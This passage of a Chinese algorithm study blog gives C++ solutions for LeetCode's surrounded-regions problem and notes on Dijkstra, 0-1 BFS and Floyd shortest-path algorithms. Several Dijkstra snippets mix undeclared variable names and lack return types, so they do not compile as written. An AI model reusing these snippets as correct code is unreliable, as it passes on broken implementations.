<h2 id="130-被围绕的区域"><a href="https://leetcode-cn.com/problems/surrounded-regions/">130. 被围绕的区域</a></h2>
<p>给你一个 <code>m x n</code> 的矩阵 <code>board</code> ，由若干字符 <code>'X'</code> 和 <code>'O'</code> ，找到所有被 <code>'X'</code> 围绕的区域，并将这些区域里所有的 <code>'O'</code> 用 <code>'X'</code> 填充。</p>
<h3 id="tip1">tip1</h3>
<blockquote>
<p>me: 用一个状态记录四周的O可以连接到的位置</p>
<p>在遍历所有位置，不能被四周连接到的改为‘X’</p>
<p>深度优先搜索</p>
</blockquote>
<figure class="highlight c++"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;iostream&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;vector&gt;</span></span></span><br><span class="line"><span class="keyword">using</span> <span class="keyword">namespace</span> std;</span><br><span class="line"><span class="function"><span class="type">void</span> <span class="title">dfs</span><span class="params">(vector&lt;vector&lt;<span class="type">char</span>&gt;&gt; &amp;board, vector&lt;vector&lt;<span class="type">bool</span>&gt;&gt; &amp;status, <span class="type">int</span> r,</span></span></span><br><span class="line"><span class="params"><span class="function">         <span class="type">int</span> c)</span></span>;</span><br><span class="line">vector&lt;<span class="type">int</span>&gt; direction = &#123;<span class="number">-1</span>, <span class="number">0</span>, <span class="number">1</span>, <span class="number">0</span>, <span class="number">-1</span>&#125;;</span><br><span class="line"><span class="function"><span class="type">void</span> <span class="title">solve</span><span class="params">(vector&lt;vector&lt;<span class="type">char</span>&gt;&gt; &amp;board)</span> </span>&#123;</span><br><span class="line">    <span class="type">int</span> m = board.<span class="built_in">size</span>(), n = board[<span class="number">0</span>].<span class="built_in">size</span>();</span><br><span class="line">    vector&lt;vector&lt;<span class="type">bool</span>&gt;&gt; <span class="built_in">status</span>(m, <span class="built_in">vector</span>&lt;<span class="type">bool</span>&gt;(n, <span class="literal">true</span>));</span><br><span class="line">    <span class="keyword">for</span> (<span class="type">int</span> i = <span class="number">0</span>; i &lt; m; i++) &#123;</span><br><span class="line">        <span class="keyword">if</span> (board[i][<span class="number">0</span>] == <span class="string">&#x27;O&#x27;</span>)</span><br><span class="line">            <span class="built_in">dfs</span>(board, status, i, <span class="number">0</span>);</span><br><span class="line">        <span class="keyword">if</span> (board[i][n - <span class="number">1</span>] == <span class="string">&#x27;O&#x27;</span>)</span><br><span class="line">            <span class="built_in">dfs</span>(board, status, i, n - <span class="number">1</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">for</span> (<span class="type">int</span> j = <span class="number">0</span>; j &lt; n; j++) &#123;</span><br><span class="line">        <span class="keyword">if</span> (board[<span class="number">0</span>][j] == <span class="string">&#x27;O&#x27;</span>)</span><br><span class="line">            <span class="built_in">dfs</span>(board, status, <span class="number">0</span>, j);</span><br><span class="line">        <span class="keyword">if</span> (board[m - <span class="number">1</span>][j] == <span class="string">&#x27;O&#x27;</span>)</span><br><span class="line">            <span class="built_in">dfs</span>(board, status, m - <span class="number">1</span>, j);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// for (const auto &amp;ele : status) &#123;</span></span><br><span class="line">    <span class="comment">//     for (const auto &amp;t : ele)</span></span><br><span class="line">    <span class="comment">//         cout &lt;&lt; t &lt;&lt; &quot; &quot;;</span></span><br><span class="line">    <span class="comment">//     cout &lt;&lt; endl;</span></span><br><span class="line">    <span class="comment">// &#125;</span></span><br><span class="line"></span><br><span class="line">    <span class="keyword">for</span> (<span class="type">int</span> i = <span class="number">0</span>; i &lt; m; i++) &#123;</span><br><span class="line">        <span class="keyword">for</span> (<span class="type">int</span> j = <span class="number">0</span>; j &lt; n; j++) &#123;</span><br><span class="line">            <span class="keyword">if</span> (status[i][j] == <span class="literal">true</span> &amp;&amp; board[i][j] == <span class="string">&#x27;O&#x27;</span>) &#123;</span><br><span class="line">                <span class="comment">// cout &lt;&lt; i &lt;&lt; &quot; &quot; &lt;&lt; j &lt;&lt; endl;</span></span><br><span class="line">                board[i][j] = <span class="string">&#x27;X&#x27;</span>;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="type">void</span> <span class="title">dfs</span><span class="params">(vector&lt;vector&lt;<span class="type">char</span>&gt;&gt; &amp;board, vector&lt;vector&lt;<span class="type">bool</span>&gt;&gt; &amp;status, <span class="type">int</span> r,</span></span></span><br><span class="line"><span class="params"><span class="function">         <span class="type">int</span> c)</span> </span>&#123;</span><br><span class="line">    status[r][c] = <span class="literal">false</span>;</span><br><span class="line">    <span class="type">int</span> x, y;</span><br><span class="line">    <span class="keyword">for</span> (<span class="type">int</span> k = <span class="number">0</span>; k &lt; <span class="number">4</span>; k++) &#123;</span><br><span class="line">        x = r + direction[k];</span><br><span class="line">        y = c + direction[k + <span class="number">1</span>];</span><br><span class="line">        <span class="keyword">if</span> (x &gt;= <span class="number">0</span> &amp;&amp; x &lt; board.<span class="built_in">size</span>() &amp;&amp; y &gt;= <span class="number">0</span> &amp;&amp; y &lt; board[<span class="number">0</span>].<span class="built_in">size</span>() &amp;&amp;</span><br><span class="line">            board[x][y] == <span class="string">&#x27;O&#x27;</span> &amp;&amp; status[x][y] == <span class="literal">true</span>) &#123;</span><br><span class="line">            <span class="comment">// status[x][y] = false;</span></span><br><span class="line">            <span class="comment">// cout &lt;&lt; x &lt;&lt; &quot;,&quot; &lt;&lt; y &lt;&lt; endl;</span></span><br><span class="line">            <span class="built_in">dfs</span>(board, status, x, y);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="type">int</span> <span class="title">main</span><span class="params">()</span> </span>&#123;</span><br><span class="line">    vector&lt;vector&lt;<span class="type">char</span>&gt;&gt; board = &#123;&#123;<span class="string">&#x27;X&#x27;</span>, <span class="string">&#x27;X&#x27;</span>, <span class="string">&#x27;X&#x27;</span>, <span class="string">&#x27;X&#x27;</span>&#125;,</span><br><span class="line">                                  &#123;<span class="string">&#x27;X&#x27;</span>, <span class="string">&#x27;O&#x27;</span>, <span class="string">&#x27;O&#x27;</span>, <span class="string">&#x27;X&#x27;</span>&#125;,</span><br><span class="line">                                  &#123;<span class="string">&#x27;X&#x27;</span>, <span class="string">&#x27;X&#x27;</span>, <span class="string">&#x27;O&#x27;</span>, <span class="string">&#x27;X&#x27;</span>&#125;,</span><br><span class="line">                                  &#123;<span class="string">&#x27;X&#x27;</span>, <span class="string">&#x27;O&#x27;</span>, <span class="string">&#x27;X&#x27;</span>, <span class="string">&#x27;X&#x27;</span>&#125;&#125;;</span><br><span class="line">    <span class="built_in">solve</span>(board);</span><br><span class="line">    <span class="built_in">system</span>(<span class="string">&quot;pause&quot;</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<h2 id="tip2">tip2</h2>
<p>优化？？？</p>
]]></content>
      <tags>
        <tag>搜索算法</tag>
      </tags>
  </entry>
  <entry>
    <title>图：最短路、最小生成树</title>
    <url>/2022/10/24/%E7%AE%97%E6%B3%95/%E5%9B%BE%EF%BC%9A%E6%9C%80%E7%9F%AD%E8%B7%AF%E3%80%81%E6%9C%80%E5%B0%8F%E7%94%9F%E6%88%90%E6%A0%91/</url>
    <content><![CDATA[<h1>最短路径</h1>
<p>求解<mark>权重相同</mark>的最短路问题可以使用广度优先搜索方法。</p>
<ul class="lvl-0">
<li class="lvl-2">
<p>BFS（权重相同）、0-1 BFS</p>
</li>
<li class="lvl-2">
<p>Dijkstra（不能存在负权边）</p>
</li>
</ul>
<h1>一、单源最短路径问题</h1>
<p>单源最短路径问题(single source shortest path，SSSP问题)</p>
<blockquote>
<p>邻接矩阵表示</p>
<p>邻接表表示</p>
</blockquote>
<p><a href="https://leetcode.cn/problems/network-delay-time/solution/gong-shui-san-xie-yi-ti-wu-jie-wu-chong-oghpz/">https://leetcode.cn/problems/network-delay-time/solution/gong-shui-san-xie-yi-ti-wu-jie-wu-chong-oghpz/</a>)</p>
<h2 id="1-Dijkstra算法（无负权边）">1. Dijkstra算法（无负权边）</h2>
<p>邻接矩阵存储：</p>
<ul class="lvl-0">
<li class="lvl-2">
<p>时间复杂度$O(n^2+m)$，求未访问的距离最近节点O(n)，总共n个节点，m条边</p>
</li>
<li class="lvl-2">
<p>空间复杂度：$O(n^2)$</p>
</li>
</ul>
<p>邻接表存储：</p>
<ul class="lvl-0">
<li class="lvl-2">
<p>时间复杂度：$O(n^2+m)$</p>
</li>
<li class="lvl-2">
<p>空间复杂度：$O(n+m)$</p>
</li>
</ul>
<p>堆优化：（采用邻接表存储，堆优化是寻找最近未被访问节点）</p>
<ul class="lvl-0">
<li class="lvl-2">
<p>时间复杂度：$O(mlogm)$</p>
</li>
<li class="lvl-2">
<p>空间复杂度：$O(n+m)$</p>
</li>
</ul>
<p>稠密图(边数远大于点数)，运行时间上，枚举写法要略快于堆的写法。</p>
<h3 id="a-邻接矩阵存储">a. 邻接矩阵存储</h3>
<figure class="highlight c++"><table><tr><td class="code"><pre><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment">	edge=[from, to, weight] 表示图中的边连接和权重</span></span><br><span class="line"><span class="comment">*/</span></span><br><span class="line"><span class="built_in">Dijkstra</span>(vector&lt;vector&lt;<span class="type">int</span>&gt;&gt; edges,<span class="type">int</span> n,<span class="type">int</span> src)&#123;</span><br><span class="line">    <span class="comment">//根据边建图，用邻接矩阵表示，区分有向图和无向图</span></span><br><span class="line">    vector&lt;vector&lt;<span class="type">int</span>&gt;&gt; <span class="built_in">graph</span>(n,<span class="built_in">vector</span>&lt;<span class="type">int</span>&gt;(n, <span class="number">-1</span>));</span><br><span class="line">    <span class="keyword">for</span>(<span class="keyword">auto</span> &amp;edge:edges)&#123;</span><br><span class="line">        <span class="type">int</span> from=edge[<span class="number">0</span>],to=edge[<span class="number">1</span>],weight=edge[<span class="number">2</span>];</span><br><span class="line">        graph[from][to]=weight;</span><br><span class="line">    &#125;</span><br><span class="line">    </span><br><span class="line">    <span class="comment">//dist[i]表示从src到i的最短距离</span></span><br><span class="line">    <span class="function">vector&lt;<span class="type">int</span>&gt; <span class="title">dist</span><span class="params">(n, INT_MAX)</span></span>;</span><br><span class="line">    <span class="comment">//记录点i是否被访问过</span></span><br><span class="line">    <span class="function">vector&lt;<span class="type">bool</span>&gt; <span class="title">visited</span><span class="params">(n,<span class="literal">false</span>)</span></span>; </span><br><span class="line">    </span><br><span class="line">    <span class="comment">//初始化src点</span></span><br><span class="line">    dist[src]=<span class="number">0</span>;</span><br><span class="line">    </span><br><span class="line">    <span class="comment">//需要求到其余n-1个点的距离</span></span><br><span class="line">  	<span class="keyword">for</span>(<span class="type">int</span> i=<span class="number">0</span>;i&lt;n;i++)&#123;</span><br><span class="line">        <span class="comment">//寻找未访问的最近的结点</span></span><br><span class="line">        <span class="type">int</span> u=<span class="number">-1</span>;</span><br><span class="line">        <span class="keyword">for</span>(<span class="type">int</span> j=<span class="number">0</span>;j&lt;n;j++)&#123;</span><br><span class="line">            <span class="keyword">if</span>(!visited[j]&amp;&amp;(u==<span class="number">-1</span>||dist[j]&lt;dist[u]))</span><br><span class="line">                u=j;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="comment">//存在节点不可达的情况</span></span><br><span class="line">        <span class="keyword">if</span>(dist[u]==INT_MAX)&#123;</span><br><span class="line">            <span class="keyword">break</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        visited[u]=<span class="literal">true</span>;</span><br><span class="line">        <span class="comment">//遍历u结点的临边</span></span><br><span class="line">        <span class="comment">//可以将不存在的边初始化为一个较大的值，这样在这里不需要判断是否存在边</span></span><br><span class="line">        <span class="keyword">for</span>(<span class="type">int</span> k=<span class="number">0</span>;k&lt;n;k++)&#123;</span><br><span class="line">            <span class="keyword">if</span>(graph[u][k]!=<span class="number">-1</span>)</span><br><span class="line">                dist[k]=<span class="built_in">min</span>(dist[k],dist[u]+graph[u][k]);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<h3 id="b-邻接表存储">b. 邻接表存储</h3>
<figure class="highlight c++"><table><tr><td class="code"><pre><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment">	edge=[from, to, weight] 表示图中的边连接和权重</span></span><br><span class="line"><span class="comment">*/</span></span><br><span class="line"><span class="built_in">Dijkstra</span>(vector&lt;vector&lt;<span class="type">int</span>&gt;&gt; edges,<span class="type">int</span> n,<span class="type">int</span> src)&#123;</span><br><span class="line">    <span class="comment">//根据边建图，用邻接矩阵表示，区分有向图和无向图</span></span><br><span class="line">    vector&lt;vector&lt;pair&lt;<span class="type">int</span>,<span class="type">int</span>&gt;&gt;&gt; <span class="built_in">graph</span>(n);</span><br><span class="line">    <span class="keyword">for</span>(<span class="keyword">auto</span> &amp;edge:edges)&#123;</span><br><span class="line">        <span class="type">int</span> from=edge[<span class="number">0</span>],to=edge[<span class="number">1</span>],weight=edge[<span class="number">2</span>];</span><br><span class="line">        g[from].<span class="built_in">push_back</span>(&#123;to,weight&#125;);</span><br><span class="line">    &#125;</span><br><span class="line">    </span><br><span class="line">    <span class="comment">//dist[i]表示从src到i的最短距离</span></span><br><span class="line">    <span class="function">vector&lt;<span class="type">int</span>&gt; <span class="title">dist</span><span class="params">(n, INT_MAX)</span></span>;</span><br><span class="line">    <span class="comment">//记录点i是否被访问过</span></span><br><span class="line">    <span class="function">vector&lt;<span class="type">bool</span>&gt; <span class="title">visited</span><span class="params">(n,<span class="literal">false</span>)</span></span>; </span><br><span class="line">    </span><br><span class="line">    <span class="comment">//初始化src点</span></span><br><span class="line">    dist[src]=<span class="number">0</span>;</span><br><span class="line">    </span><br><span class="line">    <span class="comment">//需要求到其余n-1个点的距离</span></span><br><span class="line">  	<span class="keyword">for</span>(<span class="type">int</span> i=<span class="number">0</span>;i&lt;n;i++)&#123;</span><br><span class="line">        <span class="comment">//寻找未访问的最近的结点</span></span><br><span class="line">        <span class="type">int</span> u=<span class="number">-1</span>;</span><br><span class="line">        <span class="keyword">for</span>(<span class="type">int</span> j=<span class="number">0</span>;j&lt;n;j++)&#123;</span><br><span class="line">            <span class="keyword">if</span>(!visited[j]&amp;&amp;(u==<span class="number">-1</span>||dist[j]&lt;dist[u]))</span><br><span class="line">                u=j;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="comment">//存在节点不可达的情况</span></span><br><span class="line">        <span class="keyword">if</span>(dist[u]==INT_MAX)&#123;</span><br><span class="line">            <span class="keyword">break</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        visited[u]=<span class="literal">true</span>;</span><br><span class="line">        <span class="comment">//遍历u结点的临边</span></span><br><span class="line">        <span class="keyword">for</span>(<span class="keyword">auto</span> &amp;[v,w]:graph[u])&#123;</span><br><span class="line">            dis[v]=<span class="built_in">min</span>(dis[v],dis[u]+w);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<h3 id="c-堆优化的Dijkstra算法">c. 堆优化的Dijkstra算法</h3>
<figure class="highlight c++"><table><tr><td class="code"><pre><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment">	edge=[from, to, weight] 表示图中的边连接和权重</span></span><br><span class="line"><span class="comment">*/</span></span><br><span class="line"><span class="keyword">typedef</span> pair&lt;<span class="type">int</span>,<span class="type">int</span>&gt; pii;</span><br><span class="line"><span class="built_in">Dijkstra</span>(vector&lt;vector&lt;<span class="type">int</span>&gt;&gt; edges,<span class="type">int</span> n,<span class="type">int</span> src)&#123;</span><br><span class="line">    <span class="comment">//根据边建图，用邻接矩阵表示，区分有向图和无向图</span></span><br><span class="line">    vector&lt;vector&lt;pair&lt;<span class="type">int</span>,<span class="type">int</span>&gt;&gt;&gt; <span class="built_in">graph</span>(n);</span><br><span class="line">    <span class="keyword">for</span>(<span class="keyword">auto</span> &amp;edge:edges)&#123;</span><br><span class="line">        <span class="type">int</span> from=edge[<span class="number">0</span>],to=edge[<span class="number">1</span>],weight=edge[<span class="number">2</span>];</span><br><span class="line">        g[from].<span class="built_in">push_back</span>(&#123;to,weight&#125;);</span><br><span class="line">    &#125;</span><br><span class="line">    </span><br><span class="line">    <span class="comment">//dist[i]表示从src到i的最短距离</span></span><br><span class="line">    <span class="function">vector&lt;<span class="type">int</span>&gt; <span class="title">dist</span><span class="params">(n, INT_MAX)</span></span>;</span><br><span class="line">    </span><br><span class="line">    <span class="comment">//初始化src点</span></span><br><span class="line">    dist[src]=<span class="number">0</span>;</span><br><span class="line">    </span><br><span class="line">	priority_queue&lt;pii,vector&lt;pii&gt;,greater&lt;&gt;&gt; pq;</span><br><span class="line">    pq.<span class="built_in">push</span>(&#123;<span class="number">0</span>,src&#125;);</span><br><span class="line">    </span><br><span class="line">   	<span class="keyword">while</span>(!pq.<span class="built_in">empty</span>())&#123;</span><br><span class="line">        <span class="keyword">auto</span> [cost,u]=pq.<span class="built_in">top</span>();</span><br><span class="line">        pq.<span class="built_in">pop</span>();</span><br><span class="line">        <span class="comment">// 下图红色部分给出了说明</span></span><br><span class="line">        <span class="keyword">if</span>(dis[u]&lt;cost)&#123;</span><br><span class="line">            <span class="keyword">continue</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        </span><br><span class="line">        <span class="keyword">for</span>(<span class="keyword">auto</span> &amp;[v,w]:g[u])&#123;</span><br><span class="line">            <span class="type">int</span> d=dis[u]+w;</span><br><span class="line">            <span class="keyword">if</span>(d&lt;dis[v])&#123;</span><br><span class="line">                dis[v]=d;</span><br><span class="line">                pq.<span class="built_in">push</span>(&#123;d,v&#125;);</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p><img src="https://cdn.jsdelivr.net/gh/destiny0118/picgo/pic2023/202304192049047.png" alt="image-20230419204952947"></p>
<h2 id="2-0-1-BFS">2. 0-1 BFS</h2>
<figure class="highlight c++"><table><tr><td class="code"><pre><span class="line"><span class="keyword">class</span> <span class="title class_">Solution</span> &#123;</span><br><span class="line">  <span class="keyword">public</span>:</span><br><span class="line">    <span class="type">const</span> <span class="type">int</span> inf = INT_MAX / <span class="number">2</span>;</span><br><span class="line">    vector&lt;vector&lt;<span class="type">int</span>&gt;&gt; direction = &#123;&#123;<span class="number">0</span>, <span class="number">1</span>&#125;, &#123;<span class="number">0</span>, <span class="number">-1</span>&#125;, &#123;<span class="number">1</span>, <span class="number">0</span>&#125;, &#123;<span class="number">-1</span>, <span class="number">0</span>&#125;&#125;;</span><br><span class="line">    <span class="function"><span class="type">int</span> <span class="title">minCost</span><span class="params">(vector&lt;vector&lt;<span class="type">int</span>&gt;&gt; &amp;grid)</span> </span>&#123;</span><br><span class="line">        <span class="type">int</span> m = grid.<span class="built_in">size</span>(), n = grid[<span class="number">0</span>].<span class="built_in">size</span>();</span><br><span class="line">        vector&lt;vector&lt;<span class="type">int</span>&gt;&gt; <span class="built_in">dis</span>(m, <span class="built_in">vector</span>&lt;<span class="type">int</span>&gt;(n, inf));</span><br><span class="line">        vector&lt;vector&lt;<span class="type">bool</span>&gt;&gt; <span class="built_in">vis</span>(m, <span class="built_in">vector</span>&lt;<span class="type">bool</span>&gt;(n, <span class="literal">false</span>));</span><br><span class="line">        deque&lt;<span class="type">int</span>&gt; dq;</span><br><span class="line"></span><br><span class="line">        dis[<span class="number">0</span>][<span class="number">0</span>] = <span class="number">0</span>;</span><br><span class="line">        dq.<span class="built_in">push_back</span>(<span class="number">0</span>);</span><br><span class="line">        <span class="keyword">while</span> (!dq.<span class="built_in">empty</span>()) &#123;</span><br><span class="line">            <span class="type">int</span> node = dq.<span class="built_in">front</span>();</span><br><span class="line">            dq.<span class="built_in">pop_front</span>();</span><br><span class="line"></span><br><span class="line">            <span class="type">int</span> x = node / n, y = node % n;</span><br><span class="line">            <span class="keyword">if</span> (vis[x][y]) &#123;</span><br><span class="line">                <span class="keyword">continue</span>;</span><br><span class="line">            &#125;</span><br><span class="line">            vis[x][y] = <span class="literal">true</span>;</span><br><span class="line">            <span class="keyword">for</span> (<span class="type">int</span> k = <span class="number">0</span>; k &lt; <span class="number">4</span>; k++) &#123;</span><br><span class="line">                <span class="type">int</span> p = x + direction[k][<span class="number">0</span>], q = y + direction[k][<span class="number">1</span>];</span><br><span class="line">                <span class="keyword">if</span> (p &gt;= <span class="number">0</span> &amp;&amp; p &lt; m &amp;&amp; q &gt;= <span class="number">0</span> &amp;&amp; q &lt; n) &#123;</span><br><span class="line">                    <span class="type">int</span> newD = dis[x][y] + (k + <span class="number">1</span> != grid[x][y]);</span><br><span class="line">                    <span class="keyword">if</span> (newD &lt; dis[p][q]) &#123;</span><br><span class="line">                        dis[p][q] = newD;</span><br><span class="line">                        <span class="keyword">if</span> (grid[x][y] == k + <span class="number">1</span>) &#123;</span><br><span class="line">                            dq.<span class="built_in">push_front</span>(p * n + q);</span><br><span class="line">                        &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">                            dq.<span class="built_in">push_back</span>(p * n + q);</span><br><span class="line">                        &#125;</span><br><span class="line">                    &#125;</span><br><span class="line">                &#125;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> dis[m - <span class="number">1</span>][n - <span class="number">1</span>];</span><br><span class="line">    &#125;</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure>
<h2 id="3-Bellman-Ford（负权图中求最短边）">3. Bellman Ford（负权图中求最短边）</h2>
<h3 id="SPFA算法（shortest-path-fastest-algorithm）">SPFA算法（shortest path fastest algorithm）</h3>
<h1>二、任意两点之间的最短路径</h1>
<p>Flyod算法<br>
$$<br>
\begin{align}<br>
&amp;dp[0][i][j]：初始边权重\<br>
&amp;dp[k+1][i][j]：表示从i到j经过的节点&lt;=k的最短路径长度\<br>
&amp;不经过节点k：dp[k][i][j]\<br>
&amp;经过节点k：dp[k][i][k]+dp[k][k][j]<br>
\end{align}</p>
<p>$$</p>
<figure class="highlight cpp"><table><tr><td class="code"><pre><span class="line"><span class="keyword">class</span> <span class="title class_">Solution</span> &#123;</span><br><span class="line">  <span class="keyword">public</span>:</span><br><span class="line">    <span class="function"><span class="type">int</span> <span class="title">findTheCity</span><span class="params">(<span class="type">int</span> n, vector&lt;vector&lt;<span class="type">int</span>&gt;&gt; &amp;edges, <span class="type">int</span> distanceThreshold)</span> </span>&#123;</span><br><span class="line">        vector&lt;vector&lt;vector&lt;<span class="type">int</span>&gt;&gt;&gt; <span class="built_in">dp</span>(n + <span class="number">1</span>,</span><br><span class="line">                                       vector&lt;vector&lt;<span class="type">int</span>&gt;&gt;(n, <span class="built_in">vector</span>&lt;<span class="type">int</span>&gt;(n)));</span><br><span class="line">        vector&lt;vector&lt;<span class="type">int</span>&gt;&gt; <span class="built_in">w</span>(n,<span class="built_in">vector</span>&lt;<span class="type">int</span>&gt;(n,INT_MAX/<span class="number">2</span>));</span><br><span class="line">        <span class="keyword">for</span> (<span class="keyword">auto</span> &amp;e : edges) &#123;</span><br><span class="line">            <span class="type">int</span> u = e[<span class="number">0</span>], v = e[<span class="number">1</span>], wt = e[<span class="number">2</span>];</span><br><span class="line">            w[u][v]=w[v][u]=wt;</span><br><span class="line">        &#125;</span><br><span class="line">        dp[<span class="number">0</span>]=w;</span><br><span class="line">        <span class="keyword">for</span> (<span class="type">int</span> k = <span class="number">0</span>; k &lt; n; k++) &#123;</span><br><span class="line">            <span class="keyword">for</span> (<span class="type">int</span> i = <span class="number">0</span>; i &lt; n; i++) &#123;</span><br><span class="line">                <span class="keyword">for</span> (<span class="type">int</span> j = <span class="number">0</span>; j &lt; n; j++) &#123;</span><br><span class="line">                    dp[k + <span class="number">1</span>][i][j] =</span><br><span class="line">                        <span class="built_in">min</span>(dp[k][i][j], dp[k][i][k]+dp[k][k][j]);</span><br><span class="line">                &#125;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="type">int</span> minCnt = INT_MAX;</span><br><span class="line">        <span class="type">int</span> node = <span class="number">-1</span>;</span><br><span class="line">        <span class="keyword">for</span> (<span class="type">int</span> i = <span class="number">0</span>; i &lt; n; i++) &#123;</span><br><span class="line">            <span class="type">int</span> cnt = <span class="number">0</span>;</span><br><span class="line">            <span class="keyword">for</span> (<span class="type">int</span> j = <span class="number">0</span>; j &lt; n; j++) &#123;</span><br><span class="line">                <span class="keyword">if</span> (i != j &amp;&amp; dp[n][i][j] &lt;= distanceThreshold)</span><br><span class="line">                    cnt++;</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="keyword">if</span> (cnt &lt;= minCnt) &#123;</span><br><span class="line">                minCnt = cnt;</span><br><span class="line">                node = i;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> node;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure>
<p>空间优化<br>
$$<br>
\begin{align}<br>
&amp;dp[k+1][i][j]：表示从i到j经过的节点&lt;=k的最短路径长度\<br>
&amp;不经过节点k：dp[k][i][j]（前一步计算的结果）\<br>
&amp;经过节点k：dp[k][i][k]+dp[k][k][j]\<br>
&amp;dp[k+1][i][k]=dp[k][i][k]（i到k，经过节点&lt;=k，则中间节点肯定无k）\<br>
&amp;dp[k+1][k][j]=dp[k][k][j]<br>
\end{align}</p>
<p>$$</p>
<figure class="highlight cpp"><table><tr><td class="code"><pre><span class="line"><span class="keyword">class</span> <span class="title class_">Solution</span> &#123;</span><br><span class="line">  <span class="keyword">public</span>:</span><br><span class="line">    <span class="function"><span class="type">int</span> <span class="title">findTheCity</span><span class="params">(<span class="type">int</span> n, vector&lt;vector&lt;<span class="type">int</span>&gt;&gt; &amp;edges, <span class="type">int</span> distanceThreshold)</span> </span>&#123;</span><br><span class="line">        vector&lt;vector&lt;<span class="type">int</span>&gt;&gt; <span class="built_in">dp</span>(n, <span class="built_in">vector</span>&lt;<span class="type">int</span>&gt;(n, INT_MAX / <span class="number">2</span>));</span><br><span class="line">        <span class="keyword">for</span> (<span class="keyword">auto</span> &amp;e : edges) &#123;</span><br><span class="line">            <span class="type">int</span> u = e[<span class="number">0</span>], v = e[<span class="number">1</span>], wt = e[<span class="number">2</span>];</span><br><span class="line">            dp[u][v] = dp[v][u] = wt;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">for</span> (<span class="type">int</span> k = <span class="number">0</span>; k &lt; n; k++) &#123;</span><br><span class="line">            <span class="keyword">for</span> (<span class="type">int</span> i = <span class="number">0</span>; i &lt; n; i++) &#123;</span><br><span class="line">                <span class="keyword">for</span> (<span class="type">int</span> j = <span class="number">0</span>; j &lt; n; j++) &#123;</span><br><span class="line">                    dp[i][j] = <span class="built_in">min</span>(dp[i][j], dp[i][k] + dp[k][j]);</span><br><span class="line">                &#125;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="type">int</span> minCnt = INT_MAX;</span><br><span class="line">        <span class="type">int</span> node = <span class="number">-1</span>;</span><br><span class="line">        <span class="keyword">for</span> (<span class="type">int</span> i = <span class="number">0</span>; i &lt; n; i++) &#123;</span><br><span class="line">            <span class="type">int</span> cnt = <span class="number">0</span>;</span><br><span class="line">            <span class="keyword">for</span> (<span class="type">int</span> j = <span class="number">0</span>; j &lt; n; j++) &#123;</span><br><span class="line">                <span class="keyword">if</span> (i != j &amp;&amp; dp[i][j] &lt;= distanceThreshold)</span><br><span class="line">                    cnt++;</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="keyword">if</span> (cnt &lt;= minCnt) &#123;</span><br><span class="line">                minCnt = cnt;</span><br><span class="line">                node = i;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> node;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure>
<h1>Dijkstra和floyd区别</h1>
<ul class="lvl-0">
<li class="lvl-2">
<p>Dijkstra不能处理负权图，Flyod能处理负权图；</p>
</li>
<li class="lvl-2">
<p>Dijkstra处理单源最短路径，Flyod是处理多源最短路径</p>
</li>
<li class="lvl-2">
<p><mark>在图确定后添加新的边，Flyod不用从头开始计算</mark></p>
</li>
</ul>
<h1>题单</h1>
<ul class="lvl-0">
<li class="lvl-2">
<p><input type="checkbox" id="checkbox22" checked="true"><label for="checkbox22"></label><a href="https://leetcode.cn/problems/design-graph-with-shortest-path-calculator/description/?envType=daily-question&amp;envId=2024-03-26">2642. 设计可以求最短路径的图类 - 力扣（LeetCode）</a>（动态添加边适合Floyd）</p>
</li>
<li class="lvl-2">
<h5 id="743-网络延迟时间"><a href="https://leetcode.cn/problems/network-delay-time/">743. 网络延迟时间</a></h5>
<ul class="lvl-2">
<li class="lvl-4"><a href="https://leetcode.cn/problems/network-delay-time/solution/gong-shui-san-xie-yi-ti-wu-jie-wu-chong-oghpz/">【宫水三叶】涵盖所有的「存图方式」与「最短路算法（详尽注释）」 - 网络延迟时间 - 力扣（LeetCode）</a></li>
</ul>
</li>
<li class="lvl-2">
<h5 id="882-细分图中的可到达节点"><a href="https://leetcode.cn/problems/reachable-nodes-in-subdivided-graph/">882. 细分图中的可到达节点</a></h5>
</li>
<li class="lvl-2">
<h5 id="1334-阈值距离内邻居最少的城市"><a href="https://leetcode.cn/problems/find-the-city-with-the-smallest-number-of-neighbors-at-a-threshold-distance/">1334. 阈值距离内邻居最少的城市</a></h5>
</li>
<li class="lvl-2">
